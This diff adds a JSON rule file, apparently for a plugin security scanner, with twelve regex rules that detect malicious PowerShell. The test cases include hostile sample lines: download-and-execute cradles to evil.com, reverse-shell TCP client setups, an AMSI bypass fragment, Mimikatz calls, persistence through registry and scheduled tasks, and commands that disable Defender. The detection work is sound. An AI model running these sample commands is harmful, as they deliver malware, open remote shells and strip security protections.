@@ -1,0 +1,293 @@
+{
+  "$schema": "../rule-schema.json",
+  "category": "Shell Execution",
+  "rules": [
+    {
+      "id": "PS-001",
+      "title": "Invoke-Expression / IEX",
+      "description": "Invoke-Expression (IEX) executes arbitrary strings as PowerShell commands.",
+      "severity": "critical",
+      "patterns": [
+        "\\bInvoke-Expression\\b",
+        "\\bIEX\\s*\\("
+      ],
+      "file_extensions": ["ps1", "psm1", "psd1"],
+      "remediation": "Avoid Invoke-Expression. Use direct cmdlet calls instead.",
+      "test_cases": {
+        "should_match": [
+          "Invoke-Expression $payload",
+          "IEX (New-Object Net.WebClient).DownloadString('https://evil.com')",
+          "IEX ($env:cmd)"
+        ],
+        "should_not_match": [
+          "Write-Host 'Use direct cmdlets instead'",
+          "Write-Host 'IEX is dangerous'"
+        ]
+      }
+    },
+    {
+      "id": "PS-002",
+      "title": "DownloadString/DownloadFile",
+      "description": "Downloading and executing remote content is a primary malware delivery mechanism.",
+      "severity": "critical",
+      "patterns": [
+        "\\.DownloadString\\s*\\(",
+        "\\.DownloadFile\\s*\\(",
+        "Invoke-WebRequest\\s+[^\\n]*\\|\\s*(IEX|Invoke-Expression)"
+      ],
+      "file_extensions": ["ps1", "psm1", "psd1"],
+      "remediation": "Do not download and execute remote code. Review all remote content before use.",
+      "test_cases": {
+        "should_match": [
+          "(New-Object Net.WebClient).DownloadString('https://evil.com/payload')",
+          "(New-Object Net.WebClient).DownloadFile('https://evil.com/mal.exe', 'C:\\mal.exe')",
+          "Invoke-WebRequest https://evil.com/script.ps1 | IEX"
+        ],
+        "should_not_match": [
+          "# WebClient.DownloadString docs",
+          "Invoke-WebRequest https://api.github.com"
+        ]
+      }
+    },
+    {
+      "id": "PS-003",
+      "title": "EncodedCommand execution",
+      "description": "Base64-encoded PowerShell commands are used to evade detection.",
+      "severity": "critical",
+      "patterns": [
+        "\\bpowershell\\b[^\\n]*-[Ee]nc(odedCommand)?\\s",
+        "\\bpwsh\\b[^\\n]*-[Ee]nc(odedCommand)?\\s"
+      ],
+      "file_extensions": ["ps1", "psm1", "psd1", "bat", "cmd", "sh", "bash"],
+      "remediation": "Decode and inspect encoded commands. Use plain-text scripts.",
+      "test_cases": {
+        "should_match": [
+          "powershell -EncodedCommand SQBFAFAA",
+          "powershell -enc SQBFAFAA",
+          "pwsh -EncodedCommand SQBFAFAA"
+        ],
+        "should_not_match": [
+          "powershell -Version 5",
+          "powershell -File script.ps1"
+        ]
+      }
+    },
+    {
+      "id": "PS-004",
+      "title": "Execution policy bypass",
+      "description": "Bypassing execution policy removes a security control against running untrusted scripts.",
+      "severity": "high",
+      "patterns": [
+        "-[Ee]xecutionPolicy\\s+(Bypass|Unrestricted)",
+        "Set-ExecutionPolicy\\s+(Bypass|Unrestricted)"
+      ],
+      "file_extensions": ["ps1", "psm1", "psd1", "bat", "cmd"],
+      "remediation": "Do not bypass execution policy. Sign scripts properly.",
+      "test_cases": {
+        "should_match": [
+          "powershell -ExecutionPolicy Bypass -File script.ps1",
+          "Set-ExecutionPolicy Bypass -Scope Process",
+          "Set-ExecutionPolicy Unrestricted"
+        ],
+        "should_not_match": [
+          "Get-ExecutionPolicy",
+          "Set-ExecutionPolicy RemoteSigned"
+        ]
+      }
+    },
+    {
+      "id": "PS-005",
+      "title": "PowerShell reverse shell",
+      "description": "PowerShell reverse shell connects back to attacker-controlled server.",
+      "severity": "critical",
+      "patterns": [
+        "\\bNew-Object\\s+System\\.Net\\.Sockets\\.TCPClient",
+        "\\bSystem\\.Net\\.Sockets\\.TcpListener",
+        "\\$client\\s*=\\s*New-Object\\s+Net\\.Sockets\\.TCPClient"
+      ],
+      "file_extensions": ["ps1", "psm1", "psd1"],
+      "remediation": "Remove reverse shell code immediately.",
+      "test_cases": {
+        "should_match": [
+          "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444)",
+          "New-Object System.Net.Sockets.TCPClient('evil.com',443)",
+          "$listener = New-Object System.Net.Sockets.TcpListener"
+        ],
+        "should_not_match": [
+          "# TCP client documentation",
+          "Test-NetConnection"
+        ]
+      }
+    },
+    {
+      "id": "PS-006",
+      "title": "Hidden window execution",
+      "description": "Running PowerShell with hidden window conceals malicious activity from the user.",
+      "severity": "high",
+      "patterns": [
+        "-[Ww]indowStyle\\s+[Hh]idden",
+        "\\bStart-Process\\b[^\\n]*-[Nn]o[Nn]ew[Ww]indow"
+      ],
+      "file_extensions": ["ps1", "psm1", "psd1", "bat", "cmd"],
+      "remediation": "Do not hide execution windows. All processes should be visible.",
+      "test_cases": {
+        "should_match": [
+          "powershell -WindowStyle Hidden -File evil.ps1",
+          "Start-Process powershell -NoNewWindow -ArgumentList '-File evil.ps1'"
+        ],
+        "should_not_match": [
+          "Get-Process | Where-Object {$_.MainWindowTitle}",
+          "Start-Process notepad"
+        ]
+      }
+    },
+    {
+      "id": "PS-007",
+      "title": "Credential harvesting",
+      "description": "PowerShell credential commands can steal or prompt for user credentials.",
+      "severity": "critical",
+      "patterns": [
+        "\\bGet-Credential\\b",
+        "\\bConvertTo-SecureString\\b[^\\n]*-AsPlainText",
+        "\\bMimikatz\\b",
+        "\\bInvoke-Mimikatz\\b"
+      ],
+      "file_extensions": ["ps1", "psm1", "psd1"],
+      "remediation": "Remove credential harvesting. Use proper authentication flows.",
+      "test_cases": {
+        "should_match": [
+          "$cred = Get-Credential",
+          "ConvertTo-SecureString 'Password123' -AsPlainText -Force",
+          "Invoke-Mimikatz -DumpCreds"
+        ],
+        "should_not_match": [
+          "# Credential management docs",
+          "ConvertTo-SecureString (Read-Host)"
+        ]
+      }
+    },
+    {
+      "id": "PS-008",
+      "title": "Registry manipulation",
+      "description": "Modifying Windows registry can establish persistence or disable security.",
+      "severity": "high",
+      "patterns": [
+        "\\bNew-ItemProperty\\s+[^\\n]*HKLM:",
+        "\\bSet-ItemProperty\\s+[^\\n]*HKLM:",
+        "\\bNew-ItemProperty\\s+[^\\n]*HKCU:[^\\n]*\\\\Run\\b",
+        "\\bReg\\s+Add\\b"
+      ],
+      "file_extensions": ["ps1", "psm1", "psd1"],
+      "remediation": "Plugins should not modify the Windows registry.",
+      "test_cases": {
+        "should_match": [
+          "New-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft -Name backdoor",
+          "Set-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet -Name evil",
+          "New-ItemProperty -Path HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run -Name persist",
+          "Reg Add HKLM\\SOFTWARE\\evil"
+        ],
+        "should_not_match": [
+          "Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft",
+          "Test-Path HKCU:\\SOFTWARE"
+        ]
+      }
+    },
+    {
+      "id": "PS-009",
+      "title": "AMSI bypass",
+      "description": "Bypassing AMSI (Antimalware Scan Interface) disables PowerShell malware scanning.",
+      "severity": "critical",
+      "patterns": [
+        "\\bAmsiUtils\\b",
+        "\\bamsiInitFailed\\b",
+        "\\bAmsi\\.dll\\b",
+        "\\bAmsiScanBuffer\\b"
+      ],
+      "file_extensions": ["ps1", "psm1", "psd1"],
+      "remediation": "Remove AMSI bypass code. Legitimate software does not need to bypass antimalware.",
+      "test_cases": {
+        "should_match": [
+          "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')",
+          "$amsiInitFailed = $true",
+          "[Runtime.InteropServices.Marshal]::Copy($buf, 0, $AmsiScanBuffer, 6)"
+        ],
+        "should_not_match": [
+          "# AMSI documentation reference",
+          "Test-AmsiProvider"
+        ]
+      }
+    },
+    {
+      "id": "PS-010",
+      "title": "Base64 decode and execute",
+      "description": "Decoding and executing base64 in PowerShell is a common obfuscation technique.",
+      "severity": "critical",
+      "patterns": [
+        "\\[System\\.Convert\\]::FromBase64String",
+        "\\[Convert\\]::FromBase64String",
+        "\\[System\\.Text\\.Encoding\\][^\\n]*GetString[^\\n]*FromBase64"
+      ],
+      "file_extensions": ["ps1", "psm1", "psd1"],
+      "remediation": "Decode and inspect base64 content. Use plain-text code.",
+      "test_cases": {
+        "should_match": [
+          "[System.Convert]::FromBase64String('SQBFAFAA')",
+          "[Convert]::FromBase64String($encoded)",
+          "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($payload))"
+        ],
+        "should_not_match": [
+          "[Convert]::ToBase64String($bytes)",
+          "# FromBase64String reference"
+        ]
+      }
+    },
+    {
+      "id": "PS-011",
+      "title": "Scheduled task creation",
+      "description": "Creating scheduled tasks establishes persistent execution.",
+      "severity": "high",
+      "patterns": [
+        "\\bRegister-ScheduledTask\\b",
+        "\\bNew-ScheduledTaskAction\\b",
+        "\\bschtasks\\s+/create\\b"
+      ],
+      "file_extensions": ["ps1", "psm1", "psd1", "bat", "cmd"],
+      "remediation": "Plugins should not create scheduled tasks.",
+      "test_cases": {
+        "should_match": [
+          "Register-ScheduledTask -TaskName 'Backdoor' -Action $action",
+          "New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-File evil.ps1'",
+          "schtasks /create /tn backdoor /tr evil.exe /sc onlogon"
+        ],
+        "should_not_match": [
+          "Get-ScheduledTask",
+          "Unregister-ScheduledTask -TaskName 'OldTask'"
+        ]
+      }
+    },
+    {
+      "id": "PS-012",
+      "title": "Disable Windows Defender",
+      "description": "Disabling Windows Defender removes a critical security protection.",
+      "severity": "critical",
+      "patterns": [
+        "\\bSet-MpPreference\\s+[^\\n]*-DisableRealtimeMonitoring\\s+\\$true",
+        "\\bSet-MpPreference\\s+[^\\n]*-DisableIOAVProtection\\s+\\$true",
+        "\\bDisable-WindowsOptionalFeature\\s+[^\\n]*Windows-Defender"
+      ],
+      "file_extensions": ["ps1", "psm1", "psd1"],
+      "remediation": "Never disable Windows Defender. Remove security-disabling commands.",
+      "test_cases": {
+        "should_match": [
+          "Set-MpPreference -DisableRealtimeMonitoring $true",
+          "Set-MpPreference -DisableIOAVProtection $true",
+          "Disable-WindowsOptionalFeature -Online -FeatureName Windows-Defender"
+        ],
+        "should_not_match": [
+          "Get-MpPreference",
+          "Set-MpPreference -ScanScheduleQuickScanTime 12:00:00"
+        ]
+      }
+    }
+  ]
+}
